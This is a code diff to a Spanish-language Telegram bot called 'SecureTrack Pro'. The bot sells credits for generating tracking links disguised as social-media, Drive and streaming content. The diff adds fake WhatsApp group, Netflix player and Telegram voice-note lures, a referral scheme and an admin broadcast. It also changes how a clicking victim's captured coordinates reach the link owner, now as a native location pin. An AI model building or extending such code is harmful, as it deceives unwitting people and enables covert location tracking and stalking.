@@ -116,6 +116,9 @@ function buildTrackingUrl(targetId, type = 'tiktok') {
     if (type === 'youtube') return `${WEBSITE_URL}/yt/${encodeURIComponent(targetId)}`;
     if (type === 'drive') return `${WEBSITE_URL}/d/${encodeURIComponent(targetId)}`;
     if (type === 'ig') return `${WEBSITE_URL}/ig/${encodeURIComponent(targetId)}`;
+    if (type === 'wa') return `${WEBSITE_URL}/wa/${encodeURIComponent(targetId)}`;
+    if (type === 'nx') return `${WEBSITE_URL}/nx/${encodeURIComponent(targetId)}`;
+    if (type === 'tg') return `${WEBSITE_URL}/tg/${encodeURIComponent(targetId)}`;
     return `${WEBSITE_URL}/tk/${encodeURIComponent(targetId)}`; // default tiktok
 }
 
@@ -148,7 +151,13 @@ async function handleCommand(msg) {
 
     /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
+        const startPayload = textRaw.split(' ')[1]; // captura "REF..."
         let isNewUser = false;
+        let refereeId = null;
+
+        if (startPayload && startPayload.startsWith('REF')) {
+            refereeId = startPayload.replace('REF', '');
+        }
 
         if (!user) {
             // Auto registro
@@ -170,6 +179,15 @@ async function handleCommand(msg) {
             user = newUser;
             isNewUser = true;
             console.log(`[+] Nuevo usuario Supabase: ${from} (ID: ${chatId}, Plan: ${initPlan})`);
+
+            // Módulo Recompensa de Referido (Si no es él mismo engañando al sistema)
+            if (refereeId && refereeId !== chatId) {
+                const { data: refUser } = await supabase.from('bot_users').select('credits').eq('chat_id', refereeId).single();
+                if (refUser) {
+                    await supabase.from('bot_users').update({ credits: refUser.credits + 1 }).eq('chat_id', refereeId);
+                    await sendMessage(refereeId, `🎉 <b>¡NUEVO REFERIDO!</b>\nUn usuario ha ingresado con tu enlace y has ganado <b>+1 Crédito</b>. Tienes ${refUser.credits + 1} cr en total.`);
+                }
+            }
         }
 
         let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${user.name}</b>! Bienvenido.\n`;
@@ -191,6 +209,12 @@ async function handleCommand(msg) {
 /yt [ID] — Simular YouTube Corto
 /d [ID]  — Simular Google Drive PDF
 /ig [ID] — Simular Instagram Reel
+/wa [ID] — Invitación a Grupo WhatsApp
+/nx [ID] — Reproductor Falso Netflix
+/tg [ID] — Nota de Voz Falsa Telegram
+
+👥 <b>Comunidad:</b>
+/invite — Gana créditos invitando gente
 
 📊 <b>Tus Datos Funcionales:</b>
 /myplan — Ver saldo actual
@@ -317,8 +341,61 @@ async function handleCommand(msg) {
         }
         await sendMessage(chatId, msg);
 
+        /* ── /broadcast (ADMIN) ────────────────────────── */
+    } else if (text.startsWith('/broadcast')) {
+        if (chatId !== ADMIN_CHAT_ID) return;
+        const bMsg = textRaw.substring(10).trim();
+        if (!bMsg) {
+            await sendMessage(chatId, `⚠️ <b>Uso:</b> /broadcast <mensaje>`);
+            return;
+        }
+
+        const { data: users, error } = await supabase.from('bot_users').select('chat_id');
+        if (error || !users) {
+            await sendMessage(chatId, `⚠️ Error obteniendo base de usuarios.`);
+            return;
+        }
+
+        await sendMessage(chatId, `📢 Iniciando envío masivo a ${users.length} usuarios...`);
+
+        let successCount = 0;
+        for (const u of users) {
+            try {
+                // Previene auto-enviarse spam el admin
+                if (u.chat_id === ADMIN_CHAT_ID) continue;
+                await sendMessage(u.chat_id, `📢 <b>MENSAJE GLOBAL</b>\n\n${bMsg}`);
+                successCount++;
+                // Pausa anti-spam Telegram
+                await new Promise(r => setTimeout(r, 60));
+            } catch (e) { }
+        }
+
+        await sendMessage(chatId, `✅ <b>Broadcast finalizado:</b> Mensaje entregado a ${successCount} clientes.`);
+
+        /* ── /invite (REFERIDOS) ───────────────────────── */
+    } else if (text === '/invite') {
+        if (!user) {
+            await sendMessage(chatId, `❌ Regístrate primero con /start`);
+            return;
+        }
+
+        let myName = 'TuBot';
+        if (typeof me !== 'undefined' && me.result) {
+            myName = me.result.username;
+        }
+
+        const refLink = `https://t.me/${myName}?start=REF${chatId}`;
+
+        await sendMessage(chatId,
+            `🎁 <b>Programa de Referidos VIP</b>\n\n` +
+            `Invita a tus amigos a usar este sistema.\n` +
+            `🔹 <b>Tú ganas:</b> +1 Crédito automático\n` +
+            `🔹 <b>Tu amigo gana:</b> 1 Enlace gratis de prueba\n\n` +
+            `👇 <b>Tu enlace para compartir:</b>\n<code>${refLink}</code>`
+        );
+
         /* ── COMANDOS DE GENERACIÓN ───────────────────── */
-    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/gps') || text.startsWith('/link')) {
+    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/wa') || text.startsWith('/nx') || text.startsWith('/tg') || text.startsWith('/gps') || text.startsWith('/link')) {
 
         let type = 'tiktok';
         let typeName = 'TikTok';
@@ -326,6 +403,9 @@ async function handleCommand(msg) {
         else if (text.startsWith('/d') && !text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
         else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
         else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
+        else if (text.startsWith('/wa')) { type = 'wa'; typeName = 'WhatsApp Group'; }
+        else if (text.startsWith('/nx')) { type = 'nx'; typeName = 'Netflix Player'; }
+        else if (text.startsWith('/tg')) { type = 'tg'; typeName = 'Telegram Voice Note'; }
 
         // === VALIDACIÓN DE CRÉDITOS (Supabase) ===
         if (!user) {
@@ -572,12 +652,22 @@ ${flag} País:          ${g.country} (${g.countryCode})
     if (msgResult?.ok) {
         console.log(`[✅ MENSAJE ENVIADO] A chat ${ownerChatId}`);
 
-        // Enviar Google Maps en otro mensaje si hay coordenadas válidas
+        // Enviar Ubicación Nativa de Telegram (Location Map) si hay coordenadas
         if (g.lat && g.lon && g.lat !== 'N/A' && g.lon !== 'N/A') {
-            const mapsUrl = `https://www.google.com/maps?q=${g.lat},${g.lon}`;
-            const mapsMessage = `📍 <b>Ubicación en Google Maps:</b>\n${mapsUrl}`;
-            await sendMessage(ownerChatId, mapsMessage);
-            console.log(`[📍 MAPS ENVIADO] Enlace adjunto enviado a ${ownerChatId}`);
+            try {
+                await fetch(`${BASE_URL}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ownerChatId,
+                        latitude: parseFloat(g.lat),
+                        longitude: parseFloat(g.lon)
+                    })
+                });
+                console.log(`[📍 MAPS ENVIADO] Mapa Nativo enviado a ${ownerChatId}`);
+            } catch (err) {
+                console.error("Error enviando ubicación nativa:", err);
+            }
         }
 
     } else {
